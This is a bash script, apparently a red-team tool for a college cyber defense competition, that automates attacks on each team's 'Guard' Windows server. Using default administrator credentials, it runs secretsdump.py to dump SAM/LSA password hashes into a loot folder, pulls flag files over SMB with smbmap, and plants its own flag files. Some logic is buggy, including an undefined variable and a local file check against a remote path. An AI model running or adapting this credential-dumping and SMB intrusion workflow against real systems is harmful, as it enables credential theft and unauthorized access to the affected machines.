#!/bin/bash

# Guard Autopwn with Flag Planting

# Define the username and password
USERNAME="Administrator"
PASSWORD="cdc"

# File containing the Guard server targets
TARGET_FILE="guard-targets.txt"

# Loop through each line in the target file
while IFS=',' read -r team_number target; do
  # Extract the team number and the IP:Port
  IP_PORT=$target
  
  # Construct the domain and host names
  DOMAIN="team$team_number.isucdc.com"
  HOST="guard.team$team_number.isucdc.com"
  
  # Output file named after the team number
  OUTPUT_FILE="/loot/team$team_number-guard-station-secretsdump.txt"
  
  # Print out the current operation for logging
  echo "Attempting to dump LSA/SAM from $HOST at $IP_PORT, saving to $OUTPUT_FILE"
  
  # Run secretsdump.py to dump the domain NTDS and save output to a file
  secretsdump.py "$USERNAME:$PASSWORD@$IP_PORT" > "$OUTPUT_FILE" 2>&1
  
  # Check if the command was successful
  if [ $? -eq 0 ]; then
    echo "LSA/SAM dump successful for $HOST ($IP_PORT), saved to $OUTPUT_FILE"
  else
    echo "Failed to dump SAM/LSA for $HOST ($IP_PORT), check $OUTPUT_FILE for details"
  fi

  ################ Get Blue flag ####################
  
  SMB_SHARE="C$"  
  REMOTE_FILE="C$/Windows/System32/team${team_number}_guard-station-cwindowssystem32.flag"  
  LOCAL_FILE="loot/team${team_number}_guard-station-cwindowssystem32.flag"
       

  # Download the file (downloads to the current directory)
  #TODO: Download file to LOCAL_FILE path
  smbmap -H $HOST -u $USERNAME -p $PASSWORD --download $REMOTE_FILE

  # Check if the download was successful
  if [ $? -eq 0 ]; then
      echo "File downloaded successfully"
  else
      echo "FAILED to download the file. It might not exist!"
      #Check the directories for renamed flags or other weird files with SMBMAP
      #Save output of possible flags to file for manual download
      BAD_BLUE_AD_FLAG="loot/team${team_number}_guard-station_missing-flag-search.txt"
      smbmap.py -H $HOST -u $USERNAME -p $PASSWORD -r 'c$/Windows/System32' --depth 1 -A '(flag|cdc)' > "$BAD_BLUE_AD_FLAG"
  fi
    
  ############### Plant Red Flag 1 (Admin User File) ##################

  RED_FLAG_LOCATION="C$/Users/Administrator/team${team_number}_guard-station-cusersadministrator.flag"
  LOCAL_RED_FLAG="flags/team${team_number}/team${team_number}_guard-station-cusersadministrator.flag"

  # Check if the flag file exists
    if [ ! -f "$RED_FLAG_LOCATION" ]; then
        echo "Flag file for team $TEAM_NUMBER not found at $RED_FLAG_LOCATION"
        continue
    fi

  smbmap -H $HOST -u $USERNAME -p $PASSWORD --upload $LOCAL_RED_FLAG $RED_FLAG_LOCATION

  # Check if the upload was successful
  if [ $? -eq 0 ]; then
      echo "Flag file uploaded successfully"
  else
      echo "FAILED to upload the flag"
  fi

  #TODO: Add checks to find the planted flag via SMB to verify that the flag was placed correctly.

  ######## Red Flag 2 (Prison Break) ###################

  #TODO: Create autopwn for prison break flag
  
  
  
done < "$TARGET_FILE"
